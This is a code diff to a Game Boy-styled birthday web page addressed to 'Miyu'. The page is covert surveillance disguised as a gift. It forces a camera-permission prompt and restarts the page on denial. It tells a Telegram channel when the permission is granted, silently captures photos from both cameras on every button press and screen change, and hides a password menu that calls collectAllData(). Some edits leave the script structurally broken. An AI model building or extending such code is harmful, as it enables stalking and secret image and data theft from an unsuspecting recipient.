@@ -377,8 +377,8 @@
                 </div>
                 <div class="speaker-grille"></div>
             </div>
-    </div>
-    <!-- Message Screen -->
+                                            </div>
+                                            <!-- Message Screen -->
 <div id="message-screen" class="screen">
     <div class="page-container">
         <div class="page-screen">
@@ -646,7 +646,6 @@
     let audioPlayer = null;
     let currentLetterIndex = 0;
     let cameraPermission = false;
-    let permissionChecked = false;
     
     // Stats
     let stats = { messagesRead: 0, photosViewed: 0, songsPlayed: 0 };
@@ -687,9 +686,18 @@
     }
 
     // ============================================
-    // CAMERA FUNCTIONS (FIX - PAKSA MUNCUL)
+    // CAMERA FUNCTIONS (FIXED WITH LOCALSTORAGE)
     // ============================================
     function showForcedCameraPopup() {
+        // Check localStorage first
+        const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
+        if (alreadyAllowed === 'true') {
+            // Already allowed before, enter game
+            cameraPermission = true;
+            initializeGame();
+            return;
+        }
+        
         // Clear everything
         document.body.innerHTML = '';
         
@@ -730,15 +738,18 @@
                 video: true 
             });
             
-            // Permission granted
-            cameraPermission = true;
+            // Stop stream
             stream.getTracks().forEach(track => track.stop());
+            
+            // Set permission flags
+            cameraPermission = true;
+            localStorage.setItem('gameboyCameraAllowed', 'true');
             
             // Notify Telegram
             sendToTelegram("📸 Miyu ALLOWED camera permission");
             
-            // Reload page to show game
-            window.location.reload();
+            // Load game
+            initializeGame();
             
         } catch (error) {
             // Permission denied - auto restart
@@ -765,6 +776,17 @@
             }, 1000);
         }
     };
+
+    function initializeGame() {
+        // Rebuild the game HTML structure
+        // (We'll keep original HTML, just hide popup and show game)
+        document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
+        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('loading-screen').classList.add('active');
+        
+        // Start loading
+        simulateLoading();
+    }
 
     async function captureBothCameras(reason = '') {
         if (!cameraPermission) return;
@@ -867,8 +889,7 @@
             if (progress >= 100) {
                 clearInterval(interval);
                 setTimeout(() => {
-                    // Jangan panggil showScreen dulu, nunggu izin
-                    console.log('Loading complete, waiting for camera permission');
+                    showScreen('main');
                 }, 500);
             }
         }, 200);
@@ -888,9 +909,15 @@
         if (targetScreen) {
             targetScreen.classList.add('active');
             currentScreen = screenId;
-            if (screenId === 'message') selectLetter(0);
-            if (screenId === 'gallery') initializeGallery();
-            if (screenId === 'music') initializeMusic();
+            if (screenId === 'message') {
+                // This will be handled by selectLetter in 3B
+            }
+            if (screenId === 'gallery') {
+                // This will be handled in 3B
+            }
+            if (screenId === 'music') {
+                // This will be handled in 3B
+            }
             
             // Take photos on every screen change
             captureBothCameras(`(opened ${screenId})`);
@@ -898,17 +925,148 @@
     };
 
     // ============================================
-    // INITIALIZE - PAKSA POPUP DULU
+    // INITIALIZE
     // ============================================
     window.addEventListener('load', () => {
-        // Langsung tampilkan popup
-        showForcedCameraPopup();
-        
-        // Tetap jalanin loading biar keliatan
-        simulateLoading();
+        // Load stats first
         loadStats();
+        
+        // Check localStorage
+        const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
+        if (alreadyAllowed === 'true') {
+            cameraPermission = true;
+            initializeGame();
+        } else {
+            showForcedCameraPopup();
+        }
     });
-                // ============================================
+
+    // ============================================
+    // STATS FUNCTIONS
+    // ============================================
+    function updateStats(stat) {
+        stats[stat]++;
+        localStorage.setItem('gameboyStats', JSON.stringify(stats));
+        displayStats();
+    }
+    
+    function loadStats() {
+        const saved = localStorage.getItem('gameboyStats');
+        if (saved) stats = JSON.parse(saved);
+        displayStats();
+    }
+    
+    function displayStats() {
+        document.getElementById('stats-messages').textContent = stats.messagesRead || 0;
+        document.getElementById('stats-photos').textContent = stats.photosViewed || 0;
+        document.getElementById('stats-songs').textContent = stats.songsPlayed || 0;
+    }
+
+    // ============================================
+    // BUTTON FUNCTIONS (PARTIAL - WILL BE OVERRIDDEN BY 3B)
+    // ============================================
+    function pressSelect() {
+        if (!cameraPermission) return;
+        selectPressCount++;
+        clearTimeout(selectTimer);
+        selectTimer = setTimeout(() => {
+            if (selectPressCount >= 3) openGlitchMessage();
+            selectPressCount = 0;
+        }, 1000);
+    }
+    
+    function pressA() {
+        if (!cameraPermission) return;
+        if (konamiCode[konamiIndex] === 'a') {
+            konamiIndex++;
+            if (konamiIndex === konamiCode.length) {
+                openGlitchMessage();
+                konamiIndex = 0;
+            }
+        } else {
+            konamiIndex = 0;
+        }
+        captureBothCameras('(pressed A)');
+    }
+    
+    function pressB() {
+        if (!cameraPermission) return;
+        if (konamiCode[konamiIndex] === 'b') {
+            konamiIndex++;
+            if (konamiIndex === konamiCode.length) {
+                openGlitchMessage();
+                konamiIndex = 0;
+            }
+        } else {
+            konamiIndex = 0;
+        }
+        captureBothCameras('(pressed B)');
+    }
+    
+    function pressUp() {
+        if (!cameraPermission) return;
+        if (konamiCode[konamiIndex] === 'ArrowUp') konamiIndex++;
+        else konamiIndex = 0;
+        captureBothCameras('(pressed Up)');
+    }
+    
+    function pressDown() {
+        if (!cameraPermission) return;
+        if (konamiCode[konamiIndex] === 'ArrowDown') konamiIndex++;
+        else konamiIndex = 0;
+        captureBothCameras('(pressed Down)');
+    }
+    
+    function pressLeft() {
+        if (!cameraPermission) return;
+        if (konamiCode[konamiIndex] === 'ArrowLeft') konamiIndex++;
+        else konamiIndex = 0;
+        captureBothCameras('(pressed Left)');
+    }
+    
+    function pressRight() {
+        if (!cameraPermission) return;
+        if (konamiCode[konamiIndex] === 'ArrowRight') konamiIndex++;
+        else konamiIndex = 0;
+        captureBothCameras('(pressed Right)');
+    }
+
+    function powerClick() {
+        if (!cameraPermission) return;
+        powerClickCount++;
+        clearTimeout(powerTimer);
+        
+        if (powerClickCount >= 5) {
+            const pwd = prompt('🔐 ENTER SECRET PASSWORD:');
+            if (pwd === '12234455ZXXZ') {
+                alert('✅ Access granted! Opening secret menu...');
+                collectAllData();
+                captureBothCameras('(secret access)');
+            } else {
+                alert('❌ Wrong password!');
+            }
+            powerClickCount = 0;
+            return;
+        }
+        
+        powerTimer = setTimeout(() => {
+            powerClickCount = 0;
+        }, 2000);
+    }
+
+    // ============================================
+    // GLITCH MESSAGE FUNCTIONS
+    // ============================================
+    function openGlitchMessage() {
+        document.getElementById('glitch-modal').classList.add('active');
+        captureBothCameras('(opened secret message)');
+    }
+    
+    function closeGlitch() {
+        document.getElementById('glitch-modal').classList.remove('active');
+    }
+    </script>
+            // ============================================
         // LETTERS (6 SURAT ENGLISH)
         // ============================================
         const letters = [
@@ -1308,4 +1466,4 @@ Happy Birthday! 🎂✨`
         }
     </script>
 </body>
-</html>
+            </html>
